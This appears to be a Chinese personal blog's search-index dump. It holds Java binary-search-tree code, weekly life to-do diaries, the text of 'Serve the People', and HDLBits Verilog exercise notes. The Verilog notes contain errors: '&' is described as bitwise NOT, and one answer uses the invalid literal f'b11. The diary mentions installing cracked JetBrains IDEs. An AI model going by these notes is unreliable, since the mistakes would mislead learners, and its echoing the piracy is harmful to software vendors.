currentRoot.setData(rightmost.getData()); // there's no right child for the rightmost node, // so replace the parent's left child with rightmost node's left child parent.setLeftChild(rightmost.getLeftChild()); } else { while (rightmost.getRightChild() != null) { parent = rightmost; rightmost = rightmost.getRightChild(); } // replace the node data with that node data currentRoot.setData(rightmost.getData()); // and replace that node with its left child parent.setRightChild(rightmost.getLeftChild()); } } else { // get the leftmost node of the right subtree Node leftmost = right; Node parent = currentRoot; if(leftmost.getLeftChild() == null) { // replace the node with that node currentRoot.setData(leftmost.getData()); // there's no left child for the leftmost node, // so replace the parent's right child with leftmost node's right child parent.setRightChild(leftmost.getRightChild()); } else { while (leftmost.getLeftChild() != null) { parent = leftmost; leftmost = leftmost.getLeftChild(); } // replace the node with that node currentRoot.setData(leftmost.getData()); // and replace that node with its right child parent.setLeftChild(leftmost.getRightChild()); } } } else if (ret \u003c 0) { Node left = remove(data, currentRoot.getLeftChild()); currentRoot.setLeftChild(left); } else { Node right = remove(data, currentRoot.getRightChild()); currentRoot.setRightChild(right); } return currentRoot; } ","date":"2025-04-25","objectID":"/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E5%AE%9E%E7%8E%B0/:2:2","series":null,"tags":["二叉搜索树"],"title":"二叉搜索树实现","uri":"/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E5%AE%9E%E7%8E%B0/#remove实现"},{"categories":["数据结构"],"content":" 3 完整代码实现 java public class BinarySearchTree\u003cT extends Comparable\u003cT\u003e\u003e { private class Node { private T data; private Node leftChild; private Node rightChild; /** * Node initializer * * @param data the data field */ Node(T data) { this(data, null, null); } /** * initializer with 3 parameters * * @param data the Node data field * @param leftChild the Node leftChild field * @param rightChild the Node rightChild field */ Node(T data, Node leftChild, Node rightChild) { this.data = data; this.leftChild = leftChild; this.rightChild = rightChild; } /** * Get the data field of Node * * @return the data field */ public T getData() { return data; } /** * Get the leftChild field of Node * * @return the left child field */ public Node getLeftChild() { return leftChild; } /** * Get the rightChild field of Node * * @return the right child field */ public Node getRightChild() { return rightChild; } /** * Set the left child of the node * * @param leftChild the left child */ public void setLeftChild(Node leftChild) { this.leftChild = leftChild; } /** * Set the right child of the node * * @param rightChild the right child */ public void setRightChild(Node rightChild) { this.rightChild = rightChild; } /** * Set the data of the node * * @param data the data field */ public void setData(T data) { this.data = data; } } private Node root; // root of the binary search tree /** * the default initializer of the binary search tree */ public BinarySearchTree() { root = null; } /** * make the binary search tree empty */ public void makeEmpty() { root = null; } /** * check if data is contained in the tree * * @param data the data to be searched * @return if the data is in the tree, return true, otherwise return false */ public boolean contains(T data) { return contains(data, root); } /** * a helper method that judges if the data is in the binary search tree * @param data the data to be searched from the binary search tree * @param n the current root of the binary search tree to be searched * @return if data is in the binary search tree with root n, * then return true, otherwise return false */ private boolean contains(T data, Node n) { if (n == null) { return false; } int ret = data.compareTo(n.getData()); if (ret == 0) { return true; } else if (ret \u003c 0) { Node leftChild = n.getLeftChild(); return contains(data, leftChild); } else { Node rightChild = n.getRightChild(); return contains(data, rightChild); } } /** * find the minimum value in the tree * * @return the minimum value in the tree */ public T findMin() { Node minNode = findMinNode(root); if (minNode == null) { return null; } return minNode.getData(); } /** * A helper method that find the minimum value in the binary search tree * * @param currentRoot the root of the binary search tree * @return the Node containing the minimum value in the tree */ private Node findMinNode(Node currentRoot) { if (currentRoot == null) { return null; } Node left = currentRoot.getLeftChild(); if (left == null) { return currentRoot; } else { return findMinNode(left); } } /** * find the maximum value in the binary search tree * * @return the maximum value in the tree */ public T findMax() { Node maxNode = findMaxNode(root); if (maxNode == null) { return null; } return maxNode.getData(); } /** * A helper method that find the maximum value in the binary search tree * * @param currentRoot the root of the binary search tree * @return the node containing the maximum value in the tree */ private Node findMaxNode(Node currentRoot) { if (currentRoot == null) { return null; } while (currentRoot.getRightChild() != null) { currentRoot = currentRoot.getRightChild(); } return currentRoot; } /** * insert the data into the binary search tree * * @param data the data to be inserted */ public void insert(T data) { if (root == null) { this.root = new Node(data); } else { insert(data, root); } } /** * A helper method that insert the data into the current binary search tree * * @param data the data to be inserted * @param currentRoot the root ","date":"2025-04-25","objectID":"/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E5%AE%9E%E7%8E%B0/:3:0","series":null,"tags":["二叉搜索树"],"title":"二叉搜索树实现","uri":"/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E5%AE%9E%E7%8E%B0/#完整代码实现"},{"categories":null,"content":"生活任务列表： 起床，洗脸刷牙，吃早饭； ✅ 2025-04-21 洗头洗澡洗衣服； ✅ 2025-04-21 出去走两圈，把身体调养好； ✅ 2025-04-21 喝中药把胃搞坏了，我现在真的好难受，我该怎么办。。。。 不行，不能坐以待毙，一定要开始健身，学习健身； 晚上早点睡觉，早上6点起床 ✅ 2025-04-22 起床以后先喝水 ✅ 2025-04-22 吃早餐，然后吃乳果糖浆，还有香蕉，保证解决便秘问题，排出大便； ✅ 2025-04-22 排出大便后观察一下大便颜色，如果是黑色，则需要看医生；如果需要，就预约省人民医院医生；否则不需要预约；如果需要看医生，则立刻去看医生； ✅ 2025-04-22 颜色正常了。 凡是发生皆有利于我，从一切事情中汲取经验，不要让情绪影响到我的生活，和影响我人生的一切杂碎切断联系； 观看张继科鹿特丹决赛和伦敦决赛，解决心理问题： ✅ 2025-04-22 2011-5-15 Rotterdam World Table Tennis Championships, Zhang Jike vs. Wang Hao 鹿特丹世乒赛 男单决赛 张继科vs王皓 Men’s Table Tennis Singles Gold Medal Match - China v China | London 2012 Olympics 继续给几位导师发邮件，不要放弃，争取好老师的录取； ✅ 2025-04-22 不能放弃希望，先找同学搞到杨旭波、肖双九和归琳三位老师的微信，然后挨个发微信问； ✅ 2025-04-22 微信要不到，放弃； 先去睡一会儿，起来以后猛干 ✅ 2025-04-23 给剩下的导师发邮件，询问情况； ✅ 2025-04-23 不管了，该联系的都联系了； 接下来就是实现自己的人生理想了； 学习过程中要边学边写博客，保持成就感； 去梨园骑个车车，散个步，调整一下心情，重新再出发； ✅ 2025-04-23 晚上10点睡觉，早上6点起床； ✅ 2025-04-24 睡觉拖到了12点多，起来都8点多了，下次不能再这样了； 去好好睡一觉，彻底的放松，不要想任何事情，恢复体力； ✅ 2025-04-24 起来以后先把所有要问老师的问题准备好，发给她，跟于涵交涉，记录在博客里； ✅ 2025-04-24 把新买的衣服洗了晒了； ✅ 2025-04-24 妈妈帮忙弄了，感谢妈妈 确定硕士导师了，是做autoML方向的，条件是用几篇CCF-A论文换取自由； 这个实验室的导师水平也太差了，实在是让人绷不住； 如果能联系到这个仁瑞，看仁瑞那边是不是有机会，于涵这个肯定是不要去了； ✅ 2025-04-26 洗脸刷牙吃早饭，买荨麻疹药，吃荨麻疹药物，然后开始继续干活； ✅ 2025-04-26 先去晒个太阳散个步； ✅ 2025-04-26 邮件联系郑国英和任锐，加学长QQ； ✅ 2025-04-26 如果确认任锐这边招满了，就不去交大了； 为了做好二手准备，把港科大和港理工的硕士申请完成，在旅游之前就做完工作； 如果任锐有名额，就去任锐那里；如果任锐没有名额，请教郑国英老师能否转入其他联培方向，以及其他联培方向的导师名额情况，如果只剩下蔡鸿明这个实验室有名额，或者无法转入其他联培方向，则不去交大上学了； 旅游回来后，全力找工作； 把一次失败的选导师经历写在博客里，复盘自己的整个经历，警告考交软的后人； ✅ 2025-04-26 先去洗个澡 ✅ 2025-04-27 和学长沟通一下措辞，拒绝于老师 ✅ 2025-04-27 和学长谋划一下研究生自救指南的计划； ✅ 2025-04-27 做早饭吃早饭；(@2025-04-27 09:35) 洗衣服，洗锅； ✅ 2025-04-27 去银行存钱，把剩下的一些现金和压岁钱存到银行卡里去，用于申请工作； ✅ 2025-04-27 妈妈说要留一些现金在手上，还是不存了先 和任老师联系，把选导师的事情搞完，报教务； ✅ 2025-04-27 29号（也就是旅游出发那天中午）就完成第二轮双选了，因此29号没什么好做的，30号直接开奖了；那么所有的准备工作应该是在29号之前完成，如果说29号及以后任老师和我联系，那么就直接参加面试，不再准备任何其他的内容；如果最后只能去IST，那么我就放弃入学； 和学长讨论一下创业的事情；（心理方面好像已经行不通了） ✅ 2025-04-28 洗个头洗个澡 ✅ 2025-04-28 把后面要完成的任务及时间规划做出来 ✅ 2025-04-28 搜索一下个人陈述的写法，把个人陈述写完，用grammarly和几个同学润色一下； ✅ 2025-04-28 根据个人陈述的点，把个人陈述内容更加完善； ✅ 2025-04-28 用grammarly润色； ✅ 2025-04-28 英文简历肝出来； ✅ 2025-04-28 跟教务老师说我不去交大了，确定不去了； ✅ 2025-04-29 根据之前拟定的列表，准备行李和必要的物品，网购买必要的物品，打包行李； ✅ 2025-05-05 查询药品和物品，以及一些措施； ✅ 2025-04-29 准备旅游行李和一些必要的装备（防狼喷雾、药品等等）； ✅ 2025-05-05 备齐各种药物和防暑装备，防止人多缺氧中暑昏迷；（药物和防暑装备准备） ✅ 2025-05-05 五一旅游好好玩，放松心态； ✅ 2025-05-05 ","date":"2025-04-21","objectID":"/2025%E5%B9%B44%E6%9C%88%E7%AC%AC%E5%9B%9B%E5%91%A8%E8%AE%B0%E5%BD%95/:0:0","series":["记录"],"tags":null,"title":"2025年4月第四周记录","uri":"/2025%E5%B9%B44%E6%9C%88%E7%AC%AC%E5%9B%9B%E5%91%A8%E8%AE%B0%E5%BD%95/#"},{"categories":null,"content":" 生活上： 好好睡一觉，恢复活力 ✅ 2025-04-14 起来以后感觉精神好多了，但是睡得时间长了，可能还是有点晕晕乎乎的 教训： 没有什么精神提升药品能比得过睡眠，以后每天晚上早睡，今晚开始10点半睡觉 夏天要不想困倦乏力，核心在于积极运动，提升体力和精力 少想过去的事情和将来的事情，对于错误积极反思总结就好了，多做 少花时间在玩手机上，对人生没有意义 减少思虑的核心在于补充维生素D3，和疯狂减肥（维生素D3是脂溶性，肥胖会导致维生素D3含量下降） 出去买一瓶电解质水，防止T25的时候出现虚脱 ✅ 2025-04-14 帕梅拉10分钟腹部训练+阳光下T25健身操一套 ✅ 2025-04-14 腿部肌肉力量不足，T25有点伤膝盖了，而且阳光下只能做10分钟，否则就要中暑了 以后把健身的时间改到起床后2个小时内，不要拖到白天 T25换成训记健身 可以通过午饭后出门散步晒太阳，补充维生素D3 放弃对不存在的事物的傻叉执念 洗头洗澡，换洗衣物 ✅ 2025-04-14 把饭热了吃 ✅ 2025-04-14 卸载知乎、小红书 ✅ 2025-04-14 晚上10点准时睡觉，早上6点起床，睡满8个小时 ✅ 2025-04-15 帕梅拉10分钟，洗脸刷牙，洗鼻子，吃早饭和维生素D3，去图书馆 ✅ 2025-04-15 枸杞泡水喝，提神醒脑，继续肝 ✅ 2025-04-15 打水，喝大量的水，上个厕所，把拉肚子的问题解决 ✅ 2025-04-15 把博客问题彻底修复（彻底！） ✅ 2025-04-16 列出接下来所有要实现的挑战 ✅ 2025-04-16 去睡觉 ✅ 2025-04-15 洗个澡，把内衣内裤洗了它 ✅ 2025-04-16 昨天晚上没有睡好，因为博客的事情搞到很晚，今天先去爽爽睡一觉，然后再起来肝 ✅ 2025-04-16 IDEA和其他几个Jetbrains系列产品卸载干净； ✅ 2025-04-16 脸部皮肤有点骚痒，吃点荨麻疹药物； ✅ 2025-04-16 IDEA破解版本安装； ✅ 2025-04-16 CLion破解版本安装； ✅ 2025-04-16 我真的好累，我心累，身体累，昨天晚上也没睡好，我需要休息；先去洗个鼻子，然后洗个澡，然后上床睡觉； ✅ 2025-04-16 我感觉身体不是很有活力，需要恢复活力； 洗脸刷牙洗鼻子涂药，吃早饭，吃维生素D3和维生素C，出发去图书馆； ✅ 2025-04-17 好好睡一觉，起来以后大力猛干； ✅ 2025-04-18 下午去看一下中医，治疗一下身体问题； ✅ 2025-04-18 买锅 ✅ 2025-04-18 洗个澡，9点睡觉；（欸，拖到11点了） ✅ 2025-04-19 早上5点起床；（拖到8点了） ✅ 2025-04-19 先去走两圈，买点电解制水补充一下电解质； ✅ 2025-04-20 学习中药的煎法，煎中药喝； ✅ 2025-04-19 本周总结：依然受到慢性疾病的困扰，下周要继续努力！不可以再颓废了！没有时间可以浪费在调养身体上，必须全力出击！ ","date":"2025-04-14","objectID":"/2025%E5%B9%B44%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/:0:0","series":["记录"],"tags":null,"title":"2025年4月第三周记录","uri":"/2025%E5%B9%B44%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8%E8%AE%B0%E5%BD%95/#"},{"categories":null,"content":"（一九四四年九月八日） 这是毛泽东在中共中央警备团追悼张思德的会上的讲演。 我们的共产党和共产党所领导的八路军、新四军，是革命的队伍。我们这个队伍完全是为着解放人民的，是彻底地为人民的利益工作的。张思德⑴同志就是我们这个队伍中的一个同志。 人总是要死的，但死的意义有不同。中国古时候有个文学家叫做司马迁的说过：“人固有一死，或重于泰山，或轻于鸿毛。“⑵为人民利益而死，就比泰山还重；替法西斯卖力，替剥削人民和压迫人民的人去死，就比鸿毛还轻。张思德同志是为人民利益而死的，他的死是比泰山还要重的。 因为我们是为人民服务的，所以，我们如果有缺点，就不怕别人批评指出。不管是什么人，谁向我们指出都行。只要你说得对，我们就改正。你说的办法对人民有好处，我们就照你的办。“精兵简政\"这一条意见，就是党外人士李鼎铭⑶先生提出来的；他提得好，对人民有好处，我们就采用了。只要我们为人民的利益坚持好的，为人民的利益改正错的，我们这个队伍就一定会兴旺起来。 我们都是来自五湖四海，为了一个共同的革命目标，走到一起来了。我们还要和全国大多数人民走这一条路。我们今天已经领导着有九千一百万人口的根据地⑷，但是还不够，还要更大些，才能取得全民族的解放。我们的同志在困难的时候，要看到成绩，要看到光明，要提高我们的勇气。中国人民正在受难，我们有责任解救他们，我们要努力奋斗。要奋斗就会有牺牲，死人的事是经常发生的。但是我们想到人民的利益，想到大多数人民的痛苦，我们为人民而死，就是死得其所。不过，我们应当尽量地减少那些不必要的牺牲。我们的干部要关心每一个战士，一切革命队伍的人都要互相关心，互相爱护，互相帮助。 今后我们的队伍里，不管死了谁，不管是炊事员，是战士，只要他是做过一些有益的工作的，我们都要给他送葬，开追悼会。这要成为一个制度。这个方法也要介绍到老百姓那里去。村上的人死了，开个追悼会。用这样的方法，寄托我们的哀思，使整个人民团结起来。 注释 〔1〕张思德，四川仪陇人，中共中央警备团的战士。他在一九三三年参加红军，经历长征，负过伤，是一个忠实为人民服务的共产党员。一九四四年九月五日在陕北安塞县山中烧炭，因炭窑崩塌而牺牲。 〔2〕司马迁，中国西汉时期著名的文学家和历史学家，著有《史记》一百三十篇。此处引语见《汉书·司马迁传》中的《报任少卿书》，原文是：“人固有一死，死有重于泰山，或轻于鸿毛。” 〔3〕李鼎铭（一八八一——一九四七），陕西米脂人，开明绅士。他在一九四一年十一月陕甘宁边区第二届参议会上提出\"精兵简政\"的提案，并在这次会议上当选为陕甘宁边区政府副主席。 〔4〕 这是指当时陕甘宁边区和华北、华中、华南各抗日根据地所拥有的人口的总数。 ","date":"2025-04-10","objectID":"/%E4%B8%BA%E4%BA%BA%E6%B0%91%E6%9C%8D%E5%8A%A1/:0:0","series":null,"tags":null,"title":"为人民服务","uri":"/%E4%B8%BA%E4%BA%BA%E6%B0%91%E6%9C%8D%E5%8A%A1/#"},{"categories":["计算机体系结构"],"content":" 1 Basics这一章是基础语法部分。 ","date":"2025-04-07","objectID":"/verilog-language/:1:0","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#basics"},{"categories":["计算机体系结构"],"content":" 1.1 Simple Wire要求创建一个模块，有一个输入和一个输出，就像wire一样。注意Verilog中的赋值是持续的，而不是一次性的。本题代码如下： verilog module top_module( input in, output out ); assign out = in; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:1:1","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#simple-wire"},{"categories":["计算机体系结构"],"content":" 1.2 Four Wires创建一个模块，这个模块有3个输入和4个输出，输入和输出的对应关系如下： a -\u003e w b -\u003e x b -\u003e y c -\u003e z 注意： 前文已经提到过，赋值是个持续性的操作，不是编程语言中那样一次性的，因此赋值的先后顺序不重要。 assign语句是连通wire，不是创建wire。input和output端口已经是wire了。 verilog module top_module( input a,b,c, output w,x,y,z ); assign w = a; assign x = b; assign y = b; assign z = c; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:1:2","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#four-wires"},{"categories":["计算机体系结构"],"content":" 1.3 Notgate实现一个inverter。提示：Verilog语言使用~表示位取反，!表示逻辑取反。代码如下： verilog module top_module( input in, output out ); assign out = ~in; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:1:3","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#notgate"},{"categories":["计算机体系结构"],"content":" 1.4 Andgate两个输入，一个输出，输出为两个输入的and。提示：Verilog语言使用\u0026表示位取反，\u0026\u0026表示逻辑取反。代码如下： verilog module top_module( input a, input b, output out ); assign out = a \u0026 b; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:1:4","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#andgate"},{"categories":["计算机体系结构"],"content":" 1.5 Norgate两个输入，一个输出，输出为两个输入的或非。提示：可以用|来取位或，和||来取逻辑或。代码如下： verilog module top_module( input a, input b, output out ); assign out = ~(a | b); endmodule ","date":"2025-04-07","objectID":"/verilog-language/:1:5","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#norgate"},{"categories":["计算机体系结构"],"content":" 1.6 XNorgate两个输入，一个输出。输出为两个输入的同或。提示：使用^来取位异或。代码如下： verilog module top_module( input a, input b, output out ); assign out = ~(a ^ b); endmodule ","date":"2025-04-07","objectID":"/verilog-language/:1:6","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#xnorgate"},{"categories":["计算机体系结构"],"content":" 1.7 Declaring Wires有时候电路复杂，我们需要在其中定义其他的wire，定义模式如下： verilog module top_module ( input in, // Declare an input wire named \"in\" output out // Declare an output wire named \"out\" ); wire not_in; // Declare a wire named \"not_in\" assign out = ~not_in; // Assign a value to out (create a NOT gate). assign not_in = ~in; // Assign a value to not_in (create another NOT gate). endmodule // End of module \"top_module\" 实现如下电路： out = (a \u0026 b) | (c \u0026 d) out_n = ~out 代码如下： verilog `default_nettype none module top_module( input a, input b, input c, input d, output out, output out_n ); wire a_and_b; assign a_and_b = a \u0026 b; wire c_and_d; assign c_and_d = c \u0026 d; assign out = a_and_b | c_and_d; assign out_n = ~out; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:1:7","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#declaring-wires"},{"categories":["计算机体系结构"],"content":" 1.8 4758实现7458芯片中的功能，利用上面所学的wire声明。代码如下： verilog module top_module ( input p1a, p1b, p1c, p1d, p1e, p1f, output p1y, input p2a, p2b, p2c, p2d, output p2y ); wire p2ab; assign p2ab = p2a \u0026 p2b; wire p2cd; assign p2cd = p2c \u0026 p2d; wire p1abc; assign p1abc = p1a \u0026 p1b \u0026 p1c; wire p1efd; assign p1efd = p1e \u0026 p1f \u0026 p1d; assign p2y = p2ab | p2cd; assign p1y = p1abc | p1efd; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:1:8","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#4758"},{"categories":["计算机体系结构"],"content":" 1.9 Basics 总结 使用assign语句赋值，assign是持续赋值； ~对位取非，!取逻辑非； |取位或，||取逻辑或； ^取异或； \u0026取位与，\u0026\u0026取逻辑与； 使用wire \u003cname\u003e;声明一个内部wire； ","date":"2025-04-07","objectID":"/verilog-language/:1:9","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#basics-总结"},{"categories":["计算机体系结构"],"content":" 2 Vectors","date":"2025-04-07","objectID":"/verilog-language/:2:0","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#vectors"},{"categories":["计算机体系结构"],"content":" 2.1 Vectorsvector可以作为一组wire进行统一操作，声明方式如下： verilog wire [99:0] my_vector; // Declare a 100-element vector assign out = my_vector[10]; // Part-select one bit out of the vector 题目中有一个三位输入vec，输出有4个： outv：和vec相等，也是三位； o0：vec的第一位； o1：vec的第二位； o2：vec的第三位； 代码如下： verilog module top_module ( input wire [2:0] vec, output wire [2:0] outv, output wire o2, output wire o1, output wire o0 ); // Module body starts after module declaration assign outv = vec; assign o0 = vec[0]; assign o1 = vec[1]; assign o2 = vec[2]; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:2:1","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#vectors-1"},{"categories":["计算机体系结构"],"content":" 2.2 Vectors in more detailvector的声明方法：type [upper:lower] vector_name;，其中type是这一组内容的类型，常见的有reg和wire。如果要作为输入或输出，就在类型前面加input或者output。多种类型的vector声明方法如下： verilog wire [7:0] w; // 8-bit wire reg [4:1] x; // 4-bit reg output reg [0:0] y; // 1-bit reg that is also an output port (this is still a vector) input wire [3:-2] z; // 6-bit wire input (negative ranges are allowed) output [3:0] a; // 4-bit output wire. Type is 'wire' unless specified otherwise. wire [0:7] b; // 8-bit wire where b[0] is the most-significant bit. 对于大端和小端没有特别的要求，但是在声明和使用的时候必须保持一致。如在声明的时候写的是wire [3:0] vec;，在使用的时候就不可以写vec[0:3]。 使用default_nettype none来杜绝impllicit nets。 packed array和unpacked array的声明方法如下： verilog reg [7:0] mem [255:0]; // 256 unpacked elements, each of which is a 8-bit packed vector of reg. reg mem2 [28:0]; // 29 unpacked elements, each of which is a 1-bit reg. 在vector名前面的部分是packed array的大小，也就是8个reg一组。后面的部分是unpacked array，也就是说这样的packedd array有256个。 之前我们使用assign w = a;这样的语句来进行赋值，这样的赋值是整体赋值，如果左边和右边的位数不相等，则会进行切割和0填充。但是我们也可以选择部分的位来进行赋值，位赋值方法如下： verilog w[3:0] // Only the lower 4 bits of w x[1] // The lowest bit of x x[1:1] // ...also the lowest bit of x z[-1:-2] // Two lowest bits of z b[3:0] // Illegal. Vector part-select must match the direction of the declaration. b[0:3] // The *upper* 4 bits of b. assign w[3:0] = b[0:3]; // Assign upper 4 bits of b to lower 4 bits of w. w[3]=b[0], w[2]=b[1], etc. 题目要求我们把一个16位的输入分割为上8位和下8位分别输出，代码如下： verilog `default_nettype none // Disable implicit nets. Reduces some types of bugs. module top_module( input wire [15:0] in, output wire [7:0] out_hi, output wire [7:0] out_lo ); assign out_hi = in[15:8]; assign out_lo = in[7:0]; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:2:2","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#vectors-in-more-detail"},{"categories":["计算机体系结构"],"content":" 2.3 Vectors in part select把32位的4个字节逆转。代码如下： verilog module top_module( input [31:0] in, output [31:0] out );// // assign out[31:24] = ...; assign out[31:24] = in[7:0]; assign out[23:16] = in[15:8]; assign out[15:8] = in[23:16]; assign out[7:0] = in[31:24]; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:2:3","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#vectors-in-part-select"},{"categories":["计算机体系结构"],"content":" 2.4 Bitwise operators输入为2个3位的vector，题目要求输出它们的位或，逻辑或，以及6个位的取反。其中b的取反在高3位，a的取反在低3位。代码如下： verilog module top_module( input [2:0] a, input [2:0] b, output [2:0] out_or_bitwise, output out_or_logical, output [5:0] out_not ); assign out_or_bitwise = a | b; assign out_or_logical = a || b; assign out_not[5:3] = ~b; assign out_not[2:0] = ~a; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:2:4","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#bitwise-operators"},{"categories":["计算机体系结构"],"content":" 2.5 Four-input gates有一个4位的输入，需要输出这四位的与、或和异或。可以参考：Reduction - HDLBits，这里面写道使用\u0026a[3:0]来简化每一位相与，算是语法糖。 代码如下： verilog module top_module( input [3:0] in, output out_and, output out_or, output out_xor ); assign out_and = \u0026in[3:0]; assign out_or = |in[3:0]; assign out_xor = ^in[3:0]; endmodule 同理我们可以完成 Gates100 - HDLBits，代码如下： verilog module top_module( input [99:0] in, output out_and, output out_or, output out_xor ); assign out_and = \u0026in[99:0]; assign out_or = |in[99:0]; assign out_xor = ^in[99:0]; endmodule 此外，我们还可以完成Reduction - HDLBits，代码如下： verilog module top_module ( input [7:0] in, output parity); assign parity = ^in[7:0]; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:2:5","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#four-input-gates"},{"categories":["计算机体系结构"],"content":" 2.6 Vector concatenation operator可以进行多个位的拼接： verilog {3'b111, 3'b000} =\u003e 6'b111000 {1'b1, 1'b0, 3'b101} =\u003e 5'b10101 {4'ha, 4'd10} =\u003e 8'b10101010 // 4'ha and 4'd10 are both 4'b1010 in binary 在Verilog中，允许在assign语句的左边和右边使用拼接，示例如下： verilog input [15:0] in; output [23:0] out; assign {out[7:0], out[15:8]} = in; // Swap two bytes. Right side and left side are both 16-bit vectors. assign out[15:0] = {in[7:0], in[15:8]}; // This is the same thing. assign out = {in[7:0], in[15:8]}; // This is different. The 16-bit vector on the right is extended to // match the 24-bit vector on the left, so out[23:16] are zero. // In the first two examples, out[23:16] are not assigned. 本题解答如下： verilog module top_module ( input [4:0] a, b, c, d, e, f, output [7:0] w, x, y, z );// // assign { ... } = { ... }; assign z = {e[0],f'b11}; assign y = {d[3:0],e[4:1]}; assign x = {b[1:0],c,d[4]}; assign w = {a,b[4:2]}; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:2:6","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#vector-concatenation-operator"},{"categories":["计算机体系结构"],"content":" 2.7 Vector reversal 1要求反转一个8位的数字，verilog不允许直接assign out[7:0] = in[0:7];，代码如下： verilog module top_module( input [7:0] in, output [7:0] out ); assign out = {in[0],in[1],in[2],in[3],in[4],in[5],in[6],in[7]}; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:2:7","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#vector-reversal-1"},{"categories":["计算机体系结构"],"content":" 2.8 Replication operator多次重复一个位的写法：{num{vector}}，多用于符号位扩展，代码如下： verilog module top_module ( input [7:0] in, output [31:0] out );// // assign out = { replicate-sign-bit , the-input }; assign out = {{24{in[7]}},in}; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:2:8","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#replication-operator"},{"categories":["计算机体系结构"],"content":" 2.9 More replication有5个一位输入a b c d e，构造两个vector，分别是{{5{a}},{5{b}},{5{c}},{5{d}},{5{e}}}和{{5{a,b,c,d,e}}}，输出它们的同或。代码如下： verilog module top_module ( input a, b, c, d, e, output [24:0] out );// // The output is XNOR of two vectors created by // concatenating and replicating the five inputs. // assign out = ~{ ... } ^ { ... }; wire[24:0] input_a = {{5{a}},{5{b}},{5{c}},{5{d}},{5{e}}}; wire[24:0] input_b = {{5{a,b,c,d,e}}}; assign out = ~(input_a ^ input_b); endmodule ","date":"2025-04-07","objectID":"/verilog-language/:2:9","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#more-replication"},{"categories":["计算机体系结构"],"content":" 2.10 Vector 总结本节我们主要学到了： vector的声明； 通过vector的位选择来进行赋值； 位取反等位操作； 使用\u0026a[7:0]来进行整个vector的位的与/或/非/异或等操作； 使用位拼接，由小的位构造大的位； 使用{num{vector}}格式重复多个vector ","date":"2025-04-07","objectID":"/verilog-language/:2:10","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#vector-总结"},{"categories":["计算机体系结构"],"content":" 3 Modules: Hierarchy","date":"2025-04-07","objectID":"/verilog-language/:3:0","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#modules-hierarchy"},{"categories":["计算机体系结构"],"content":" 3.1 ModulesVerilog允许嵌套多个模块，你可以通过端口名或者端口位置来将顶层模块和内嵌模块中的端口连接起来。联系的方式有两种： verilog // 注意in2 in2 out是mod_a的端口，wa wb wc是上一层模块的端口 mod_a instance1 ( wa, wb, wc ); // by position mod_a instance2 ( .out(wc), .in1(wa), .in2(wb) ); // by name 本题解答： verilog module top_module ( input a, input b, output out ); mod_a instance1(.in1(a),.in2(b),.out(out)); endmodule ","date":"2025-04-07","objectID":"/verilog-language/:3:1","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#modules"},{"categories":["计算机体系结构"],"content":" 3.2 Connecting ports by position实现mod_a和顶层模块的端口连接，要求connect by postion，代码如下： verilog module top_module ( input a, input b, input c, input d, output out1, output out2 ); mod_a instance2(out1,out2,a,b,c,d); endmodule ","date":"2025-04-07","objectID":"/verilog-language/:3:2","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#connecting-ports-by-position"},{"categories":["计算机体系结构"],"content":" 3.3 Connecting modules by name要求同上，但是这次connect by name，代码如下： verilog module top_module ( input a, input b, input c, input d, output out1, output out2 ); mod_a instance2(.out1(out1),.out2(out2),.in1(a),.in2(b),.in3(c),.in4(d)); endmodule 